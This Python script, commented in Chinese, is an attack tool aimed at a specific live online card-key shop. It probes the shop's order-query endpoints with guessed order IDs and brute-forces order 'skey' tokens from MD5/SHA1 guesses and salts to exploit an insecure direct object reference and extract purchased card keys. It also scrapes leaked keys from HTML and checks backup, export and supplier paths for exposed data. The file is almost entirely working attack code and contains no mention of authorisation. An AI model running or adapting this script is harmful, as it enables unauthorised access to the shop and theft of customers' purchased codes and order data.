#!/usr/bin/env python3
"""卡密/订单数据面定位扫描 — 经 CN 代理或直连."""
from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import sys
import time
from pathlib import Path

BASE = "https://htqq.lol/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
LANG = "Accept-Language: zh-CN,zh;q=0.9"
PROXY = os.environ.get("PROXY_URL", "")
OUT = Path(os.environ.get("OUT", f"/tmp/htqq_km_scan_{int(time.time())}"))
OUT.mkdir(parents=True, exist_ok=True)


def curl(url: str, method: str = "GET", data: str | None = None, cookie: str | None = None,
         referer: str | None = None, save: str | None = None) -> tuple[int, str]:
    cmd = ["curl", "-sk", "--max-time", "20", "-A", UA, "-H", LANG]
    if PROXY:
        cmd += ["-x", PROXY]
    if cookie:
        cmd += ["-c", cookie, "-b", cookie]
    if referer:
        cmd += ["-H", f"Referer: {referer}"]
    if method == "POST":
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded"]
        if data:
            cmd += ["-d", data]
    cmd.append(url)
    r = subprocess.run(cmd, capture_output=True, text=True)
    body = r.stdout
    if save:
        Path(save).write_text(body, encoding="utf-8", errors="replace")
    return (0 if body else -1, body)


def log(msg: str) -> None:
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line)
    with open(OUT / "log.txt", "a") as f:
        f.write(line + "\n")


def main() -> None:
    findings: list[dict] = []
    ck = str(OUT / "cookies.txt")

    log(f"=== 卡密/订单数据面 scan proxy={PROXY[:40]}... ===")

    # 1. baseline
    _, gc = curl(f"{BASE}/ajax.php?act=getcount", referer=f"{BASE}/")
    log(f"getcount: {gc[:200]}")
    try:
        orders = int(json.loads(gc).get("orders", 0))
    except Exception:
        orders = 18052

    # 2. download query.js
    _, qjs = curl(f"{BASE}/assets/faka/js/query.js", save=str(OUT / "query.js"))
    log(f"query.js size={len(qjs)}")

    # 3. query page
    _, qhtml = curl(f"{BASE}/?mod=query", cookie=ck, referer=f"{BASE}/?mod=query",
                    save=str(OUT / "query.html"))
    log(f"query.html size={len(qhtml)}")

    # extract form hints
    for m in re.finditer(r'name="([^"]+)"', qhtml):
        log(f"  form field: {m.group(1)}")

    # 4. query ajax variants
    log("--- query ajax ---")
    payloads = [
        "type=1&qq=18052", "type=1&qq=18029", "type=1&qq=18000",
        f"type=1&qq={orders}", "type=2&qq=test@test.com",
        "type=1&qq=20260713145905128", "type=1&qq=000000018052",
    ]
    for p in payloads:
        _, body = curl(f"{BASE}/ajax.php?act=query", method="POST", data=p, cookie=ck,
                       referer=f"{BASE}/?mod=query")
        if body.strip():
            log(f"query POST {p} => {body[:300]}")
            if "kminfo" in body or ('"code":0' in body and "不存在" not in body and "验证" not in body):
                findings.append({"type": "query_leak", "payload": p, "body": body[:500]})

    # 5. query page POST
    log("--- query page POST ---")
    for kw in ["18052", "18029", str(orders), "test@test.com", "20260713145905128"]:
        _, body = curl(f"{BASE}/", method="POST", data=f"mod=query&kw={kw}", cookie=ck,
                       referer=f"{BASE}/?mod=query", save=str(OUT / f"qpost_{kw}.html"))
        if "kminfo" in body or "showOrder" in body:
            log(f"QUERY POST kw={kw} HIT kminfo/showOrder")
            findings.append({"type": "query_page_leak", "kw": kw})
        m = re.search(r"showOrder\((\d+),\s*'([^']+)'\)", body)
        if m:
            log(f"SKEY LEAK kw={kw} id={m.group(1)} skey={m.group(2)}")
            findings.append({"type": "skey_in_html", "id": m.group(1), "skey": m.group(2)})

    # 6. order ajax skey brute on recent ids
    log("--- order ajax skey brute ---")
    ids = list(range(orders - 15, orders + 1)) + [1, 100, 18000]
    salts = ["", "htqq", "faka", "345a36b5fa7be2bdd2f1724157952938"]
    for oid in ids:
        candidates = {
            "", "test", str(oid),
            hashlib.md5(str(oid).encode()).hexdigest(),
            hashlib.md5(f"{oid}htqq".encode()).hexdigest(),
            hashlib.md5(f"{oid}faka".encode()).hexdigest(),
            hashlib.sha1(str(oid).encode()).hexdigest(),
        }
        for s in salts:
            if s:
                candidates.add(hashlib.md5(f"{oid}{s}".encode()).hexdigest())
        for skey in candidates:
            _, body = curl(f"{BASE}/ajax.php?act=order", method="POST",
                           data=f"id={oid}&skey={skey}", referer=f"{BASE}/?mod=query")
            if "kminfo" in body:
                log(f"KM HIT id={oid} skey={skey} => {body[:300]}")
                findings.append({"type": "order_idor", "id": oid, "skey": skey, "body": body[:500]})
            elif '"code":0' in body and "验证失败" not in body:
                log(f"ORDER OK id={oid} skey={skey} => {body[:200]}")
                findings.append({"type": "order_ok", "id": oid, "skey": skey, "body": body[:300]})
            time.sleep(0.05)

    # 7. data location paths
    log("--- card/order storage paths ---")
    paths = [
        "ajax.php?act=gettool&cid=2", "ajax.php?act=getleftcount&tid=2",
        "sup/fakalist.php", "sup/list.php", "sup/ajax.php?act=fakalist",
        "user/ajax.php?act=orders", "api.php/?act=search&id=18052",
        "other/getshop.php?trade_no=18052", "other/getshop.php?trade_no=20260713145905128",
        "toollogs.php", "?buyok=1", "?mod=order&orderid=18052",
        "?mod=order&orderid=20260713145905128",
        "data/", "backup/", "export.php", "km.php", "card.php", "orders.php",
    ]
    for p in paths:
        url = f"{BASE}/{p}" if not p.startswith("?") else f"{BASE}/{p}"
        _, body = curl(url, referer=f"{BASE}/")
        code_guess = "ok" if body and "_guard" not in body[:200] else "blocked"
        hints = []
        for kw in ["kminfo", "卡密", "km", "card", "order", "password", "mysql"]:
            if kw in body.lower():
                hints.append(kw)
        if hints or (p.startswith("sup/") and len(body) > 500):
            log(f"PATH {p} hints={hints} size={len(body)}")
        if "kminfo" in body.lower():
            findings.append({"type": "path_kminfo", "path": p, "snippet": body[:300]})

    # 8. sup JS endpoints
    _, supf = curl(f"{BASE}/sup/fakalist.php", save=str(OUT / "sup_fakalist.html"))
    acts = set(re.findall(r"ajax\.php\?act=([a-zA-Z_]+)", supf))
    log(f"sup/fakalist.php acts: {acts} size={len(supf)}")

    summary = {
        "orders": orders,
        "findings_count": len(findings),
        "findings": findings,
        "data_locations": {
            "kminfo_api": "POST ajax.php?act=order {id,skey} → data.kminfo (query.js L62-63)",
            "query_api": "POST ajax.php?act=query {type,qq} → triggers showOrder(id,skey)",
            "query_page": "GET/POST ?mod=query&kw= → 订单查询页",
            "order_page": "GET ?mod=order&orderid=trade_no → 支付页(未付无卡密)",
            "getshop": "GET other/getshop.php?trade_no= → 付款状态JSON",
            "sup_fakalist": "GET sup/fakalist.php → 供货商卡密库存(需登录)",
            "sup_list": "GET sup/list.php → 供货商订单(需登录)",
            "gettool": "GET ajax.php?act=gettool → 商品元数据(无卡密)",
            "getcount": "GET ajax.php?act=getcount → 经营统计(无卡密)",
            "api.php": "彩虹Playbook IDOR → 本目标HTTP 000封死",
        },
    }
    (OUT / "summary.json").write_text(json.dumps(summary, ensure_ascii=False, indent=2))
    log(f"DONE findings={len(findings)} out={OUT}")
    print(json.dumps(summary, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
